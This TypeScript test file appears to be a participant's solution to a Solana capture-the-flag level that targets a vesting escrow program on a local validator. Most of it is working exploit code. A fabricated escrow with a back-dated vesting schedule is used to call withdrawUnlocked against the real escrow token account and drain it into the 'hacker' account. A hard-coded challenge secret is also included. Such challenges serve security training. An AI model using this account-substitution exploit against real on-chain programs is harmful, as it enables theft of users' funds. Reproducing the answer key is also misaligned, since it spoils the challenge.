import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import { Level4 } from "../target/types/level_4";
import * as path from "path";
import * as fs from "fs";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createAccount,
  createAssociatedTokenAccount,
  getAssociatedTokenAddressSync,
  getOrCreateAssociatedTokenAccount,
  TOKEN_2022_PROGRAM_ID,
} from "@solana/spl-token";

const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD");
const ESCROW = new web3.PublicKey(
  "Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP"
);
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey(
  "2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv"
);
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey(
  "RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa"
);
const SENDER = new web3.PublicKey(
  "J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5"
);
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey(
  "2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8"
);

// x x x x x x x x x x x x x x x x x x x x x
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v

const SECRET =
  "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd";

// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x

describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair("../accounts/hacker.json");
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;

  let escrowPdaAuthority: any;

  before("Setup", async () => {
    await airdrop(
      provider.connection,
      hacker.publicKey,
      10 * anchor.web3.LAMPORTS_PER_SOL
    );

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync(
      [anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")],
      program.programId
    );
  });

  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v

  it("Do it", async () => {
    const tee = await program.account.escrow.fetch(ESCROW);
    console.table({
      start: tee.startTime.toNumber(),
      end: tee.endTime.toNumber(),
      amoutn: tee.amount.toNumber(),
      inter: tee.interval.toNumber(),
    })
    const escrow = web3.Keypair.generate();
    const escrowTokenAccount = await createAccount(provider.connection, hacker, USDC, hacker.publicKey, anchor.web3.Keypair.generate(), {
      commitment: "confirmed",
    }, TOKEN_2022_PROGRAM_ID);
    let now = new anchor.BN(1726825113); // current time in seconds
    const amount = new anchor.BN(1000); // amount to vest
    const start = now.subn(10); // start vesting in the past so that we do not need to wait
    const end = now; // end now so that we do not need to wait to withdraw whole vested amount
    const interval = new anchor.BN(1); // unlock new amount every X seconds
    const tx = await program.methods
      .initVesting(hacker.publicKey, amount, start, end, interval)
      .accounts({
        sender: hacker.publicKey,
        senderTokenAccount: HACKER_TOKEN_ACCOUNT,
        escrow: escrow.publicKey,
        escrowTokenAccount: escrowTokenAccount,
        mint: USDC,
        tokenProgram: TOKEN_2022_PROGRAM_ID,
        systemProgram: web3.SystemProgram.programId,
      })
      .signers([hacker, escrow])
      .rpc();



    await program.methods
      .withdrawUnlocked()
      .accounts({
        recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
        escrow: escrow.publicKey,
        escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
        escrowPdaAuthority: escrowPdaAuthority,
        mint: USDC,
        tokenProgram: TOKEN_2022_PROGRAM_ID,
        systemProgram: web3.SystemProgram.programId,
        recipient: hacker.publicKey,
      })
      .signers([hacker])
      .rpc({ commitment: "confirmed" });

    await program.methods
      .withdrawUnlocked()
      .accounts({
        recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
        escrow: escrow.publicKey,
        escrowTokenAccount: escrowTokenAccount,
        escrowPdaAuthority: escrowPdaAuthority,
        mint: USDC,
        tokenProgram: TOKEN_2022_PROGRAM_ID,
        systemProgram: web3.SystemProgram.programId,
        recipient: hacker.publicKey,
      })
      .signers([hacker])
      .rpc({ commitment: "confirmed" });

    const xasda = await program.account.escrow.fetch(escrow.publicKey);
    console.table({
      start: xasda.startTime.toNumber(),
      end: xasda.endTime.toNumber(),
      amount: xasda.amount.toNumber(),
      inter: xasda.interval.toNumber(),
    })

    const yyy = await provider.connection.getParsedAccountInfo(
      HACKER_TOKEN_ACCOUNT
    );
    console.log('HACKER_TOKEN_ACCOUNT', yyy.value.data.parsed.info.tokenAmount.uiAmount);

    const sdfsdfsyyy = await provider.connection.getParsedAccountInfo(
      escrowTokenAccount
    );
    console.log('escrowTokenAccount', sdfsdfsyyy.value.data.parsed.info.tokenAmount.uiAmount);

    const es = await provider.connection.getParsedAccountInfo(
      ESCROW_TOKEN_ACCOUNT
    );
    console.log('ESCROW_TOKEN_ACCOUNT', es.value.data.parsed.info.tokenAmount.uiAmount);
  })

  it.skip("Exploit", async () => {
    // const recipient = new web3.PublicKey(
    //   "H6hsz95AWEzCeHzvnXhs84gDxuiKdmZ6qgKtWqVFZfQJ"
    // );
    // const recipientTokenAccount = await createAccount(
    //   provider.connection,
    //   hacker,
    //   USDC,
    //   recipient,
    //   null,
    //   {
    //     commitment: "confirmed",
    //   },
    //   TOKEN_2022_PROGRAM_ID
    // );

    // console.log("recipientTokenAccount", recipientTokenAccount.toBase58());
    // const escrowData = await program.account.escrow.fetch(ESCROW);
    // console.log(escrowData);
    // console.log(hacker.publicKey.toBase58());
    // const [xxx] = web3.PublicKey.findProgramAddressSync(
    //   [recipient.toBuffer(), Buffer.from("ESCROW_SEED")],
    //   program.programId
    // );
    // console.log(xxx.toBase58());
    // const xxx = web3.Keypair.generate();
    // const transaction = new web3.Transaction();
    // transaction.add(
    //   web3.SystemProgram.createAccount({
    //     fromPubkey: hacker.publicKey,
    //     newAccountPubkey: xxx.publicKey,
    //     programId: program.programId,
    //     lamports: 1670400,
    //     space: 112,
    //   })
    // );

    // await provider.sendAndConfirm(transaction, [hacker, xxx]);

    // const xxxTokenAccount = await getOrCreateAssociatedTokenAccount(
    //   provider.connection,
    //   hacker,
    //   USDC,
    //   escrowPdaAuthority,
    //   true,
    //   "confirmed",
    //   {},
    //   program.programId
    // );
    // const xyy = await provider.connection.getParsedAccountInfo(xxx.publicKey);
    // console.log(xyy);
    // const yyy = await provider.connection.getParsedAccountInfo(
    //   recipientTokenAccount
    // );
    // console.log(yyy);

    // await program.methods
    //   .initVesting(
    //     hacker.publicKey,
    //     new anchor.BN(100),
    //     new anchor.BN(0),
    //     new anchor.BN(10),
    //     new anchor.BN(5)
    //   )
    //   .accounts({
    //     escrow: xxx,
    //     escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
    //     mint: USDC,
    //     sender: hacker.publicKey,
    //     senderTokenAccount: HACKER_TOKEN_ACCOUNT,
    //     systemProgram: web3.SystemProgram.programId,
    //     tokenProgram: TOKEN_2022_PROGRAM_ID,
    //   })
    //   .signers([hacker])
    //   .rpc();

    await program.methods
      .withdrawUnlocked()
      .accounts({
        recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
        escrow: ESCROW,
        escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
        escrowPdaAuthority: escrowPdaAuthority,
        mint: USDC,
        tokenProgram: TOKEN_2022_PROGRAM_ID,
        systemProgram: web3.SystemProgram.programId,
        recipient: hacker.publicKey,
      })
      .signers([hacker])
      .rpc({ commitment: "confirmed" });
  });

  // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE ABOVE
  // | | | | | | | | | | | | | | | | | | | | |
  // x x x x x x x x x x x x x x x x x x x x x

  it("Bug evaluation", async () => {
    await program.methods
      .revealSecret(SECRET)
      .accounts({
        hacker: hacker.publicKey,
        hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
        mint: USDC,
      })
      .signers([hacker])
      .rpc({ commitment: "confirmed" });
  });
});

async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(
    await connection.requestAirdrop(address, amount),
    "confirmed"
  );
}

function load_keypair(name: string): anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData));
}
